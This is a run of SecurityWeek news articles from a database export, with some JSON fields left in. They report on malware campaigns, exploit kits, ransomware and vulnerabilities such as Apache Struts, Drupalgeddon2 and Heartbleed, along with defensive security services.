ineffective. It might also just be a good way to make the user install iBanking on his phone so that the bot masters can make use of the other spying functionalities of iBanking.\" Since Google has improved their filtering of malicious apps from the Google Play store, Android malware authors have had to get more creative, explained Jeff Davis, vice president of engineering at Quarri Technologies. \"The iBanking/Webinject scheme uses what is becoming a standard technique: first it infects the user’s PC [and] then it uses this position to inject code into the user’s PC web browser on a trusted site, telling the user that the trusted site wants them to 'sideload' an Android app, ostensibly for security reasons,\" Davis said. \"The attack even includes instructions on how to change their Android settings to allow sideloading, which should be a big red flag but apparently isn’t.\" " }

The flaw, tracked as CVE-2017-9805, affects applications that use the REST plugin with the XStream handler for XML payloads, and it exists due to the way Struts deserializes untrusted data. An exploit and a Metasploit module for the vulnerability were created within hours after the patch was released. lgtm, the company that discovered the flaw, warned that at least 65 percent of Fortune 100 companies use Struts and they could all be exposed to remote attacks due to this vulnerability. However, Contrast Security, which provides protection against these types of exploits, said only less than one percent of its customers’ Java applications use the problematic REST plugin. Furthermore, data from the Maven repository shows that less than a dozen applications use this plugin. Nevertheless, security firms have already started seeing exploitation attempts. Cisco Talos and Belgium-based NVISO Labs both spotted attacks whose apparent goal was to find vulnerable servers. The attacks spotted by these companies involved a Russian website sending the requests and receiving the results of the exploitation attempt. Cisco has also observed attacks whose goal was to deliver a potentially malicious file. Researchers were unable to determine what payload had been served, but based on previous Apache Struts attacks, they believe it was likely DDoS bots, spam bots or other malware. “Within 48 hours of disclosure we were seeing systems activity exploiting the vulnerability. To their credit the researchers disclosed the vulnerability responsibly and a patch was available before disclosure occurred,” explained Cisco’s Nick Biasini. “However, with money at stake bad guys worked quickly to reverse engineer the issue and successfully develop exploit code to take advantage of it. In today's reality you no longer have weeks or months to respond to these type of vulnerabilities, it's now down to days or hours and every minute counts.” CVE-2017-9805 was patched by Apache Struts developers with the release of version 2.5.13, which also addresses a couple of less severe denial-of-service (DoS) vulnerabilities tracked as CVE-2017-9804 and CVE-2017-9793. Cisco informed customers on Thursday that it’s working to determine which of its products are affected by these flaws. At the time of publication, only Cisco Emergency Responder is impacted, but not by the critical remote code execution weakness. The previously exploited Apache Struts 2 vulnerability, tracked as CVE-2017-5638, affected more than 20 Cisco products. In the meantime, Struts developers released another update, version 2.3.34, which addresses an additional remote code execution vulnerability tracked as CVE-2017-12611. However, this vulnerability, related to Freemarker tags, has been classified as having moderate severity. " }

A report published on Monday by the security firm revealed that Orangeworm was first identified in January 2015. The group has focused on organizations in the healthcare sector, which accounts for nearly 40% of targets, but it has also launched attacks on other industries that are somehow related to healthcare, including IT (15%), manufacturing (15%), logistics (8%), and agriculture (8%). Specifically, victims in other sectors include medical device manufacturers, IT firms that provide services to clinics, and logistics companies that deliver healthcare products. Researchers say companies outside the healthcare industry have been targeted in supply chain attacks with the ultimate goal of gaining access to the systems of the intended entity. The highest percentage of victims has been spotted in the United States (17%), but Orangeworm has also targeted organizations in Saudi Arabia, India, Philippines, Hungary, United Kingdom, Turkey, Germany, Poland, Hong Kong, Sweden, Canada, France, and several other countries around the world. “While Orangeworm has impacted only a small set of victims in 2016 and 2017 according to Symantec telemetry, we have seen infections in multiple countries due to the nature of the victims operating large international corporations,” Symantec said in its report.  Once they gain access to the targeted organization’s systems, the hackers deploy a custom backdoor tracked by Symantec as Trojan.Kwampirs. The malware allows attackers to remotely access the compromised machine. The malware first collects information about the computer to determine if it may be of interest or if it’s a device belonging to a researcher. If the victim is of interest, the backdoor is “aggressively” copied to other systems with open network shares. Symantec points out that Kwampirs has been found on machines hosting software used for high-tech imaging devices, such as MRI and X-Ray machines. The malware was also spotted on devices used to assist patients in completing consent forms. However, experts say the exact motives of Orangeworm are unclear. The list of commands sent by the attackers to the malware include instructions for collecting system and network data, and obtaining information on running processes, system services, network shares, account policies, and local and domain admin accounts. Symantec says it does not have any information that could help determine the threat group’s origins, but the company believes Orangeworm is likely conducting corporate espionage and there is no evidence that the operation is backed by a nation state. Experts noted that the actors behind Orangeworm do not appear to be concerned about their activities being detected. The method used by Kwampirs to propagate over the network has been described as “noisy” and the attackers have done few changes to the malware since it was first discovered by researchers.

The malware caught the attention of Arbor Networks researchers after a link to a VirusTotal analysis was posted on Twitter by an Italy-based expert who uses the online moniker Antelox. An analysis of the Trojan and its dropper showed that the threat could be linked to the Potao malware family. The Potao malware, which has been described as a “universal modular cyber espionage toolkit,” has been around since at least 2011, but it was first analyzed in detail in 2015 by ESET. In its report on Operation Potao Express, ESET said the malware was most probably of Russian origin and it had been used in attacks aimed at entities in Ukraine, Russia, Georgia and Belarus, including what experts described as “high-value targets.” The new malware that Arbor Networks believes may be linked to Potao has been dubbed “Acronym” based on a debugging string and the URLs pointing to command and control (C&C) servers. Acronym and its dropper appear to have been compiled in mid-February. The dropper is designed to kill the wmpnetwk.exe Windows process and replace the legitimate wmpnetwk.exe file with the malware. Once executed, Acronym uses the Registry or the Task Scheduler to ensure that it’s persistent. It then contacts a C&C server and sends it information about the infected machine. Similar to Potao, Acronym is a modular malware. Its built-in commands allow attackers to capture screenshots, download and execute other files, and run plugins. Since the C&C servers were offline at the time of Arbor’s analysis, researchers have not been able to identify any of the plugins. However, similarities in the plugin functionality have led experts to believe that Acronym may be connected to Potao. Other similarities include the use of the same C&C infrastructure, attempts to contact C&C domains on the same ports, and the use of temporary file names that start with “HH.” On the other hand, there are several differences when it comes to encryption and how the malware is delivered – unlike Potao, Acronym’s dropper does not use decoy documents, DLL files or process injections. Furthermore, some parts of the Acronym code, including for HTTP communications, encryption and the screenshot functionality, appear to have been copied from publicly available examples. “As usual with new malware it is too soon to assess how active and widespread this new family will become, but it does have a potential link to a long running malware campaign known as Operation Potao Express that makes it worth watching,” said Arbor Networks’ Dennis Schwarz.

In its threat report for Q3, Trend Micro reported that the U.S. accounted for 30 percent of PoS malware infections. The next three places on the list – Taiwan, Philippines and Italy – each accounted for six percent of infections. \"Early this year, one of the largest retail companies in the U.S. disclosed that approximately 40 million consumer credit and debit card information was compromised as a result of a breach in its systems,\" according to the report. \"Not long afterward, Home Depot topped that record when it disclosed that more than 100 million customer records that included credit card information was stolen as a result of a payment systems breach. The threat actors behind these breaches attacked the retailers’ point-of-sale (PoS) systems. BlackPOS was implicated in the incident reported early this year, while BlackPOS version 2 was used in the Home Depot breach. This further indicates that PoS networks are highly accessible and vulnerable.\" The report identified three new pieces of PoS malware that were spotted during the third quarter: BrutPOS (Tibrun), Backoff (POSLOGR) and BlackPOS Version 2 (MEMLOG). Recently, researchers at Trend Micro identified a new piece of PoS malware detected by the firm as TSPY_POSLOGR.K that is designed to read the memory associated with specific processes written in the .INI file. It then saves the data to files named \"rep.bin\" and \"rep.tmp.\" \"Based on the other PoS malware behaviors we observed, it appears to be designed as multicomponent malware similar to an earlier BlackPOS variant named TSPY_MEMLOG.A, as it might require another component to retrieve the dumped data,\" Anthony Joe Melgarejo, threat response engineer at Trend Micro, explained in a blog post. \"It is highly possible that this is deployed as a package.\" The report also noted a spike in online banking malware infections between the second and third quarters. As in the case of PoS malware, the United States was the most affected country, accounting for about 13 percent of infections. \"Our findings confirm that we are battling rapidly moving cybercriminals and evolving vulnerabilities simultaneously,\" said Raimund Genes, CTO at Trend Micro, in a statement. \"With this fluidity, it's time to embrace the fact that compromises will continue, and we shouldn't be alarmed or surprised when they occur.  Preparation is key and as an industry we must better educate organizations and consumers about heightened risks as attacks grow in volume and in sophistication. Understanding that cybercriminals are finding vulnerabilities and potential loopholes in every device and platform possible will help us confront these challenges so technology can be used in a positive way.\" " }

These “Masque attacks” had not been spotted in the wild, but the recent Hacking Team breach revealed that the techniques have been put to use. FireEye has identified several vulnerabilities (CVE-2014-4494, CVE-2015-3722, CVE-2015-3725 and CVE-2015-3725) that can be exploited on iOS devices to replace legitimate apps, collect sensitive data, bypass the operating system’s prompt for trust, hijack traffic, access the data of other apps, and demolish applications. The flaws have been reported to Apple and fixed fully or partially with the release of iOS 8.1.3 and iOS 8.4. The security firm said it had not seen any Masque attacks in the wild. However, while analyzing the files leaked by hackers from the controversial Italy-based spyware maker Hacking Team, researchers discovered 11 iOS applications that leveraged Masque attack techniques. The applications are weaponized versions of popular apps such as Facebook, Twitter, WhatsApp, Facebook Messenger, Chrome, Viber, BlackBerry Messenger, Skype, Telegram and VK. The rogue apps, which come with an extra binary designed for sensitive data exfiltration, can replace the legitimate apps on devices running iOS versions prior to 8.1.3, including non-jailbroken devices. This is possible because the malicious apps have the same bundle identifiers as the genuine apps hosted on the Apple App Store. FireEye says this is the first case of targeted iOS malware being used against non-jailbroken devices. “Note that the bundle identifiers are actually configurable by the remote attackers. So for iOS devices above 8.1.3, although the Masque Attack vulnerability has been fixed (apps with the same bundle identifiers cannot replace each other), the attackers can still use a unique bundle identifier to deploy the weaponized app,” FireEye researchers explained in a blog post. The malicious apps work by using the LC_LOAD_DYLIB command of the MachO format to inject a specially crafted dylib into the genuine application. For each of the apps, the malicious dylib hooks various functions for data theft. Hacking Team is known for its sophisticated surveillance solutions so it’s not surprising that the malicious iOS apps are capable of intercepting a wide range of sensitive information, including voice calls, text messages, browser history, GPS coordinates, contact information, and photos. While iOS is considered by many to be much more secure than Android, researchers often find serious vulnerabilities in Apple’s mobile operating system. Vulnerability management company Secunia revealed at the Black Hat security conference in Las Vegas earlier this week that a total of 80 flaws have been identified this year in iOS. " }

According to the company, its proprietary Endpoint Threat Intelligence technology and specialized signatures are used in combination with an endpoint threat detection platform from Carbon Black from Bit9 to deliver the service.  As part of the managed service offering, clients’ endpoints are continuously monitored in real time for signs of malicious cyber activity, and if anything suspicious is discovered, Dell's experts immediately analyze the findings in an effort to determine if an organization’s endpoints have been compromised, how they were compromised and how best to mitigate the threat.  “An integrated end-to-end approach to security is absolutely necessary in today’s cyber threat environment, but it must also be accompanied by expert skills and the right technical components to be successful,” said Christina Richmond, Program Director for IDC's Infrastructure Security Services research practice. “Enterprises are focused on endpoint security, and they should be due to the countless breaches of late and the apparent ease at which criminals are able to pull off these cyber heists. Managed security services which help detect malicious activity on the network and the endpoint, before it can transpire into a full blown compromise, gives organizations a significant advantage over cyber attackers, and is invaluable in battling today’s cyber criminals.\" “Some of the most serious cyber breaches to date are a result of organizations having one or more of their endpoints compromised,” said Tyler Winkler, executive director of sales and marketing for Dell SecureWorks. “Cyber criminals continue to perfect their tactics and procedures, enabling them to avoid many of today’s cyber defenses. Therefore, it is critical that organizations employ comprehensive and robust network security, as well as ‘always on’ 24x7 Endpoint Security.”  “Today’s security leaders need to establish an evolved security posture; one that gives them the power to prevent, detect and respond to advanced threats in real time,” said Michael Viscuso, Bit9’s chief strategy officer and co-founder of Carbon Black. “By leveraging the Bit9 + Carbon Black endpoint sensor in its AETD solution, Dell SecureWorks is ensuring that its clients have continuous, real-time visibility into all activity on every endpoint and server. This will enable them to identify precisely how, where and when an attack started so they can help the client prevent it from happening again.” Dell SecureWorks already offers Managed Advanced Malware Protection (MAMP) service, and a Targeted Threat Hunting service.  The new Endpoint Threat Detection service is currently available in North America and will be available in EMEA toward the end of Q2 2014, the company said. " }

The purpose of the database, which he has dubbed WhiteScope, is to help users identify legitimate ICS/SCADA files. The database includes files and file hashes for ICS and SCADA software from vendors such as Advantech, Siemens and Rockwell Automation. \"These artifacts were gathered from installation media and running systems,\" according to a note on the 'About' section of the WhiteScope site. \"The whitelists can be used for initial triage during incident response engagements, security assessments, intrusion detection/prevention products.\" Many ICS and SCADA software vendors don't sign their products – a reality that can make determining whether a file is legitimate or not rather tedious. \"I have no idea why ICS/SCADA vendors don't sign their software,\" Rios told SecurityWeek in an email. \"All the software on the iPhone and iPad is signed. All the files and even the games for the Nintendo Wii are signed! Instead of waiting for vendors to sign their code, I created WhiteScope.\" If a hash/file is not in the database, it does not necessarily mean it is malicious – only that WhiteScope has not seen it previously. In that case, if the file is not signed, users should check WhiteScope's 'Supported Products' page to make sure the product they are looking at is on the product list.  \"If the product is not in the list, please consider working with us to get a good set of hashes for that product,\" according to a FAQ on the site. \"If the product is in the product list and the file doesn't match anything we have, I would start an investigation on that file, have fun.\" \"WhiteScope has over 300,000 files,\" Rios noted. \"This includes all the files for GE Cimplicity and Siemens WinCC versions which were recently targeted by BlackEnergy. WhiteScope will have half a million files loaded before the end of the year, including device firmware files. My goal is to have a million files before the first quarter of 2015 ends.\" \"Hackers are targeting ICS and SCADA,\" he continued. \"Folks doing incident response in the SCADA industry are at a severe disadvantage. The basic metadata (known good hashes, known good registry writes, process information...etc) are all missing. The ICS/SCADA vendors should be providing this data, but in many cases they don't even know themselves. Hopefully WhiteScope helps those in the ICS/SCADA industry develop better security tools for their ICS/SCADA environments.\" " }

The new OTX Endpoint Threat Hunter service is part of the AlienVault Open Threat Exchange (OTX) platform, which allows private firms, security researchers, and government agencies to openly collaborate and share information on emerging threats, attack methods, and malicious actors. OTX can be accessed for free by anyone and provides more than 19 million threat indicators contributed by over 80,000 users. The new Endpoint Threat Hunter service is available to any registered OTX user. Endpoint Threat Hunter allows organizations to discover threats on critical machines and assess the risk of malware and other attacks, AlienVault said. The service relies on AlienVault Agent, a lightweight endpoint agent that executes predefined queries against one or more OTX pulses – each pulse includes a summary of the threat, a view into the targeted software, and related IoCs. The agent can be easily installed on Windows, Linux and other endpoint devices. AlienVault has described several scenarios where Endpoint Threat Hunter can be useful. For example, in case of a global malware attack, users can select the pulse associated with the threat and initiate a scan. Once the scan has been completed, a list of the endpoints impacted by the malware is displayed. Users can also conduct scans for multiple pulses – for example, all pulses updated in the past week or the past month, or only pulses contributed by AlienVault researchers. OTX Endpoint Threat Hunter can also be used to initiate scans that look for processes running only in memory (a common tactic used by malware), cryptocurrency mining activity, and malicious or annoying Chrome extensions.

Instead of asking for money, the attackers behind this campaign instruct victims to make a political statement on their website. The ransomware, dubbed “RanRan,” is designed to encrypt various types of files stored on the infected system, including documents, archives, images, executables, logs, databases, source code and video files. A .zXz extension is assigned to encrypted files and an HTML file containing instructions on how to recover the files is dropped onto the device. Victims are told not to shut down their computer or run any antivirus program as this can lead to “accidental damage on files.” Unlike other ransomware, which typically ask for money, the threat group behind RanRan instructs victims to create a subdomain with a politically inflammatory name on their website. Victims are also instructed to upload to this subdomain a file named “Ransomware.txt” with the text “Hacked!” and their email address. “By performing these actions, the victim, a Middle Eastern government organization, has to generate a political statement against the leader of the country,” said Palo Alto Networks researchers. “It also forces the victim to publicly announce that they have been hacked by hosting the Ransomware.txt file.” Palo Alto Networks has not named any of the targeted government organizations and it has not made links to known threat groups. However, the security firm did say that it had not found any connection between these attacks and the recent Shamoon 2 campaign. According to researchers, the RanRan malware is not sophisticated and its developers have made some mistakes when implementing the file encryption mechanism, which appears to be based on publicly available source code. “RanRan makes a number of mistakes when encryption occurs,” researchers said. “For one, they use a symmetric cipher (RC4) with a re-used key. Additionally, some files are encrypted, but the originals are not deleted. This is due to a number of reasons, one of which being that encryption is attempted against system files and other files that are opened by running processes.” Palo Alto Networks said victims of this ransomware may be able to decrypt some of the files if certain conditions are met.

{ "_id" : { "$oid" : "5b27c3fb6cefc41c844ab261" }, "Category" : "Malware", "Title" : "Researchers Pave Way For Automated Analysis of Malware Images", "Address" : "https://www.securityweek.com/researchers-pave-way-automated-analysis-malware-images", "Date" : "August 06, 2015", "Article" : "LAS VEGAS - BLACK HAT USA 2015 - Researchers at Invincea have tested the effectiveness of an automated analysis system that focuses on the images embedded in malware. Desktop icons and various other types of images are often used by malware creators to lure users. A perfect example are the PDF icons leveraged to get users to open a malicious executable by tricking them into thinking that it’s a harmless document. As part of a Defense Advanced Research Projects Agency (DARPA) project focusing on new types of malware analysis, Invincea researchers have demonstrated that an automated system designed to analyze images embedded in malware could improve threat detection rates, and it could help researchers understand how new malware tricks users and determine which adversary is behind a certain threat.  Alex Long, research engineer at Invincea Labs, presented the results of their work on Wednesday at the Black Hat conference in Las Vegas. “Using the images in malware to analyze the sample puts malware authors in a ‘catch-22’ dilemma, because images are a huge part of how they manipulate users. We're basically saying to malware authors, ‘You can keep using images to increase your chances of tricking a user, but we're also going to be using images to make it easier for us to detect and understand your malware.’,” Long told SecurityWeek. “Given the vast amount of research going into malware detection approaches, and the promising preliminary results our work has shown, we believe that this relatively simple idea has the potential to complement other approaches very effectively and should be continued further as a new signal in malware analysis,” he added. According to Long, more than half of the two million malware samples provided by DARPA had at least one image embedded. The automated analysis of malware images has two main stages: identifying malware samples using visually similar image sets, and classifying the images (e.g. fake antiviruses, installers, game-related threats). For the first component, Invincea relied on a technique known as “Average Hash.” This technique involves reducing an image to grayscale, stretching it or shrinking it to a certain size, increasing its contrast, and converting it to a binary vector. After an average pixel value is obtained, a hash is generated by comparing the value of each pixel to this average. This allows the analysis system to efficiently compare a malware image with images from a given set regardless of their contrast, scale, or color scheme. The classification of malware images into categories relies on the Google Image Search API and user-defined queries. “For the image classification work, we used Google Image Search results to get images representing the various semantic classes of interest. So for example, if you want training data for Internet Explorer icons, you do a search for ‘internet explore’\" with some advanced search settings to narrow down the results to just icons,” Long explained. For some of the tested categories, such as fake word processors, researchers obtained very good results, but in other categories the malware images were misclassified at an unacceptable rate.  “The goal in our research was to make this process entirely automated. Malware authors are using automated processes to produce an essentially endless stream of polymorphic variants from a single malware sample, so malware analysts must begin to rely more on automated approaches as well,” Long said. “Using our approach, the extraction, comparison, and visualization of matching images is done completely automatically so an analyst can go from receiving 200,000 fresh new malware samples that he knows nothing about, to seeing a ‘social network’ of their shared images with literally the push of a button,” the expert noted. “[The image classification] process was also entirely automated, so choosing how you want to classify malware images is as simple as adding a few words (like ‘anti-virus’) for the new search query, to the list of queries in our system.” Processing images often requires a lot of system resources, but Invincea has attempted to develop an analysis system that works efficiently. “Staying in the theme of scalability, we focused on approaches that would be computationally-cheap. Average hash is a good example of that, as the entire algorithm takes 20-30 lines of code in python and is nearly instantaneous to run,” Long told SecurityWeek. “In order to maintain effective performance when performing image matching across potentially millions of images, we used the open source library, FLANN, which is short for ‘Fast Light-Weight Approximation of Nearest Neighbors.’ This uses a technique that is much more complex than kNN to approximate the results of kNN without having to perform the costly pair-wise comparisons between every possible pair of images. This allows us to do nearest neighbor calculations across hundreds of thousands of images in a few seconds, making any performance impact virtually negligible.” Before image analysis can be integrated into a commercial solution, the overall accuracy of the system needs to be improved, the researcher said. “This work was performed near the tail end of a 4 year DARPA-backed program, so our main goal was just publishing the idea into the community. We wanted to demonstrate that the concept had potential, which I believe we did,” Long said. " }

In the past year, Shadow Brokers has apparently tried to make a significant amount of money by offering to sell various tools and exploits used by the Equation Group, a cyber espionage actor linked by researchers to the NSA. After several failed attempts, the Shadow Brokers’ latest offer involves monthly leaks for which interested parties have to pay a fee ranging between 100 Zcash (roughly $24,000) and 16,000 Zcash (roughly $3.8 million) -- older dumps can be acquired for a few hundred Zcash while the price of future dumps will increase exponentially. An analysis of their cryptocurrency addresses showed that the hackers have made at least tens of thousands of dollars from the monthly dump service. With the September release, announced on Wednesday, Shadow Brokers informed interested entities that they will offer two dumps every month, and that Monero digital currency is no longer accepted. While the content of each leak is not disclosed, one of the files made available for free this month, a user manual, suggests that last month’s dump included an NSA tool known as UNITEDRAKE. UNITEDRAKE is a modular platform that allows users to take complete control of a Windows machine. It was one of the tools mentioned by The Intercept in 2014 when it started releasing files from NSA whistleblower Edward Snowden. The tool was also detailed in February 2015 by Kaspersky Lab in the first report to link tools detailed in Snowden documents to a cyberespionage group, namely the Equation Group. Kaspersky tracked UNITEDRAKE as EquationDrug, whose successor was GrayFish. The security firm said EquationDrug and GrayFish were used between 2003 and 2014, and described them as the most sophisticated espionage platforms used by the Equation Group. In particular, dumping UNITEDRAKE would be interesting: Might end up outing major NSA operations by enabling attribution. — Nicholas Weaver (@ncweaver) September 6, 2017    Some pointed out that screenshots included in the UNITEDRAKE manual appear to show that the NSA had used McAfee antivirus based on the presence of the McAfee agent icon in the taskbar. However, it’s worth pointing out that, for several years, a limited version of the McAfee antivirus was installed alongside Adobe Flash Player if users neglected to untick a box during installation. The Shadow Brokers claim this month’s dump contains exploits, but experts doubt too many people are willing to pay the increasingly significant amounts of money, especially since at least one previous subscriber complained that they only received a worthless tool after paying tens of thousands of dollars. 16000 ZEC at today's rate is $3.8 million.

It also has RAM scrapping and keylogging features. \"For today, we have identified close to 80 compromised merchants in EU/US/AUS,\" IntelCrawler CEO Andrew Komarov said in an email to SecurityWeek. \"We see active growth of this malware, having pretty similar functions of famous RAM scrapping trojans, but with some advanced features...for password interception within the sessions of specific retail management systems.\" The malware has a “File Upload” option that can be used for updating the payload remotely, according to the firm. \"The process of malware was masked under “PGTerm.exe” or “hkcmd.exe”, as well as legitimate names of software such as Google Chrome,\" IntelCrawler explained in a blog post. \"Adversaries use this option for the installation of additional backdoors and tools, which allows them to avoid infrastructure limitations and security policies designed for detection.

These cases have a common denominator of weak passwords and logins, many of which were found in large third-party breaches, according to the firm. \"Some recent POS investigations have revealed organized crime groups distributing malicious code and compromising networking environments of merchants and credit card devices, including ticket vending machines and electronic kiosks installed in public places and mass transport systems,\" according to the company. \"One of the compromised devices was found in Sardinia in August 2014, giving the bad actors unauthorized access to it through VNC.\" Komarov said that the attackers are installing the malware using unsecure remote administration channels, including tools like TeamViewer and pcAnywhere. In some cases, the attackers are looking for specific retail management systems in order to compromise them using application vulnerabilities as well. \"We advise to secure [these] devices properly, and not to connect them to public static IPs or to organize insecure remote administration channel to them,\" he said. \"All the traffic should be [encapsulated] into VPN, as well as ACL list should be created to define trusted hosts for connections.\" Earlier this year, IntelCrawler discovered Nemanja, a botnet comprised of roughly 1,500  terminals and other systems, and POSCLOUD, which targets cloud-based PoS software used by many grocery stores, retailers, and other small businesses.

Researchers at Trustwave have determined that the crimeware has already been used to infect more than 1.3 million devices from all over the world. Part of the source code for the 2.0 version of the RIG exploit kit was leaked online earlier this year apparently as a result of a dispute between the main developer and a reseller. The developer recently launched RIG 3.0 and he has made some improvements that should prevent unauthorized access to the source code. According to Trustwave, whose researchers managed to track down and access the administration servers used by two RIG instances, the latest version of the exploit kit is responsible for more than 3.5 million infection attempts. Experts said over 1.3 million of these attempts were successful (34 percent success rate), with most of the victims located in Brazil (450,529 infections) and Vietnam (302,705). Roughly 45,000 infected systems are in the United States, 10,000 in the United Kingdom, and 4,000 in Canada, but the numbers will likely increase over the next period. Trustwave has determined that there are, on average, 27,000 new infections per day. The high infection rates have been attributed to the many vulnerabilities discovered over the past period in Adobe Flash Player, including the zero-days leaked as a result of the Hacking Team breach. Victims’ computers are infected with various pieces of malware, but 70 percent of infections involve the Tofsee spam bot. Interestingly, only one of the RIG 3.0 customers distributes Tofsee and experts estimate that he earns between $60,000 and $100,000 per month. Trustwave says that a majority of the traffic to RIG exploit kit landing pages (90 percent) comes from malvertising campaigns. Malicious actors have used real-time bidding to ensure that their malicious ads are displayed on websites. One of the advertisers whose services are abused is buy-targeted-traffic.com, which allows attackers to buy 1,000 ad impressions for as low as 20 cents. While most of the malware-serving ads will be displayed on less popular websites, in some cases the ads will be displayed on high-profile sites if bids are won. The RIG 3.0 infrastructure is mainly the same as the one used for RIG 2.0, but there are some notable changes. The virtual dedicated server (VDS), which contains the exploits used by RIG and acts as a tunnel between the administration server and the proxy layer that serves the exploits to the victims, is located on the same IP as RIG 2.0, and it seems to have remained intact and largely unnoticed. However, RIG 3.0 uses only one VDS which, according to experts, indicates that the reseller model either no longer exists or that reseller systems are kept separately, possibly as a result of the recent source code leak. As far as security improvements are concerned, the developer of the RIG exploit kit has patched the vulnerabilities that allowed the reseller to steal source code. Unauthenticated users are now banned from accessing internal files hosted on the backend server, and payloads are no longer stored in a folder on the server to prevent users from uploading backdoors. The RIG developer has also started using CloudFlare to protect his creation’s control panel against distributed denial-of-service (DDoS) attacks. In RIG 2.0, the format of the landing page URL was constant, which allowed security products to easily detect RIG exploit kit attacks. With the release of RIG 3.0, the developer has replaced a static string that was always present in the URL (“PHPSSESID”) with a randomized token. Finally, experts noted that the user interface has been changed in RIG 3.0. “It seems that exploit kits, much like the mythological hydra, just keep coming back. Chopping off one head merely grows two new ones to replace it. They are growing more accurate, more sophisticated, and worst of all, more widespread,” Trustwave researchers said. " }

The activities of the cyber espionage group known as the Animal Farm came to light in March 2014, when a French publication released a series of slides from Edward Snowden. The slides belonged to Canada's Communications Security Establishment (CSE) and they detailed an espionage campaign dubbed “Operation Snowglobe.” Further analysis by various security firms revealed that the Animal Farm group had been using several pieces of malware whose names have been inspired by cartoon characters, including Babar, Dino, Casper and Bunny. Other malware families used by the threat actor are NBot and Tafacalou. The group, previously believed to have been active since at least 2009, has targeted government organizations, military contractors, private firms, media companies, activists, and humanitarian aid organizations in many countries around the world. Back in 2015, Kaspersky mentioned that it had found evidence of some Animal Farm malware being developed as far back as 2007, but the company did not share any details. Palo Alto Networks now says it has found a 2007 version of Babar, also known as Snowball. Researchers pointed out that the previously analyzed samples of this malware had dated back to 2011. “Analysing historical malware samples helps us learn about its set of features and technical capabilities. This helps us compare a tool used by one adversary to that used by similarly adversaries at that time,” Palo Alto’s Dominik Reichel said in a blog post. Researchers analyzed a loader with a compilation timestamp of 11/09/2007 11:37:36 PM and a payload apparently compiled 10 seconds later. While timestamps can be modified, experts believe these are genuine. This version of Babar was capable of obtaining information about the compromised machine, rebooting or shutting down the infected system, downloading files, and killing arbitrary processes. When obtaining information on the default Web browser, the malware uses a method that does not work on Chrome, which Google released in 2008, further indicating that the samples were truly developed in 2007. Researchers also pointed out that the malware had abused the official website of the Permanent Council of Accounting of the Democratic Republic of the Congo (cpcc-rdc.org) for command and control (C&C) communications. Experts also found a design flaw that resulted in configuration data that should have been encrypted to be accessible in clear text, which is surprising considering that the malware was developed by a sophisticated actor. Code and structure analysis suggests that the Casper malware used by Animal Farm is based on this version of Babar. Overall, Palo Alto Networks believes this piece of malware is “only average” compared to other malware created at that time by threat groups believed to be backed by nation states, such as Regin or Careto. The theory that a French intelligence agency is behind the Animal Farm is based on information from the CSE slides, the targeted entities, language and regional settings, and various strings found in the malware code. Palo Alto Networks’ analysis also found that the loader and the main payload for the 2007 version of Babar had the resource language ID set to 1036, which corresponds to French. " }

While much of the online activity targeting CVE-2018-7600 still appears to represent scanning (i.e. attempts to find vulnerable systems), attackers have also started exploiting the flaw to install malware. The SANS Internet Storm Center has spotted attempts to deliver a cryptocurrency miner, a simple PHP backdoor that allows attackers to upload more files to the targeted server, and an IRC bot written in Perl. One of the attacks observed by SANS delivers the XMRig Monero miner. In the same attack, the hackers have also downloaded a script that kills competing miners on the compromised system.  Data from Imperva shows that 90% of activity is associated with scanning, 3% with backdoors, and 2% with miners. A vast majority of the attacks seen by the company originated from the United States (53%) and China (45%). Researchers at Volexity have also been monitoring Drupalgeddon2 attacks and they have linked one of the Monero miner campaigns to a cybercrime group that last year exploited a vulnerability in Oracle WebLogic Server (CVE-2017-10271) to infect systems with cryptocurrency malware. Volexity identified some of the wallets that had stored the group’s cryptocurrency and found more than $100,000 in Monero. The Drupalgeddon 2 vulnerability can be exploited for remote code execution and it allows malicious actors to take complete control of websites. The flaw affects Drupal 6, 7 and 8, and it was patched with updates released in late March. Experts expected to see exploits almost immediately, but the first attacks were spotted only two weeks later, after a technical analysis and a proof-of-concept (PoC) exploit were made public. “It appeared every one of the black hats was waiting for someone else to do the research and share the exploit. Perhaps most hackers don’t care for the actual work of finding ways to exploit a vulnerability. They just wait until something is public and then use it to attack. Before that, we saw almost no traffic whatsoever!” Imperva said. Now, based on the volume of attempts to exploit CVE-2018-7600, researchers at both Sucuri and SANS warn that users should assume their Drupal websites have been compromised if the patches have not been installed.

The flaw, which was disclosed Monday, can be exploited to compromise the secret keys used to identify service providers and encrypt traffic, usernames, passwords and content. Dubbed 'Heartbleed' because the bug is in the OpenSSL implementation of the TLS/DTLS heartbeat extension (RFC6520), the vulnerability was introduced to OpenSSL in December 2011 and has been out in the wild since OpenSSL release 1.0.1 on March 14, 2012. OpenSSL versions 1.0.1 through 1.0.1f are vulnerable, but the latest version released Monday - 1.0.1g - is not. \"Looking only at web servers, it seems that OpenSSL 0.9.8 and 1.0.0 are still the most popular versions, which are not affected,\" said Mark Schloesser, security researcher for Rapid7. \"However, we count at least a few hundred thousand servers using affected library versions, so it poses a significant threat. As the same problem affects other protocols/services such as mail servers and databases, we assume that, overall we're looking at millions of vulnerable systems connected to the public Internet.\" According to an advisory from the OpenSSL Project, the issue comes down to a missing bounds check in the handling of the TLS heartbeat extension that can reveal up to 64K of memory to a connected client or server. However, the researchers that discovered the bug added that there technically is no 64K limit to the attack, as that limit applies only to a single heartbeat.  According to researchers at security vendor Codenomicon, who discovered the bug along with Neel Mehta from Google, an attacker can either keep reconnecting or keep requesting arbitrary numbers of 64 kilobyte chunks of memory content during an active TLS connection until enough secrets are revealed.   \"We have tested some of our own services from attacker's perspective,\" Codenomicon noted in an FAQ on the findings. \"We attacked ourselves from outside, without leaving a trace. Without using any privileged information or credentials we were able steal from ourselves the secret keys used for our X.509 certificates, user names and passwords, instant messages, emails and business critical documents and communication.\" TLS client certificate authentication does not mitigate the issue, nor does OpenSSL's FIPS mode, according to Codenomicon. However, using Perfect Forward Secrecy (PFS) should keep past communications from retrospective decryption. A proof-of-concept exploit for the vulnerability has already made its way online. According to Fox-IT, Yahoo is among the sites vulnerable to attack. \"It is possible to detect successful exploitation of this vulnerability by inspecting the network traffic,\" blogged Joost Bijl of Fox-IT. \"We have developed Snort signatures to detect succesful exploitation of the ‘heartbleed bug’.\" \"This bug,\" he added, \"affects both sides of the connection. Not only will client certificates not save you from having to update your server certificate, they can be read from the client (along with your username, password etc.) by any server you connect to. DNS poisoning, MitM etc. can be used to direct clients to a malicious server – it seems that this vulnerability can be exploited before the server has to authenticate itself.\"   “OpenSSL is runs atop two of the most widely used Web servers, Apache and nginx, as well as email servers and chat services, VPN and other software that use the code library,\" Ken Westin, a security researcher with 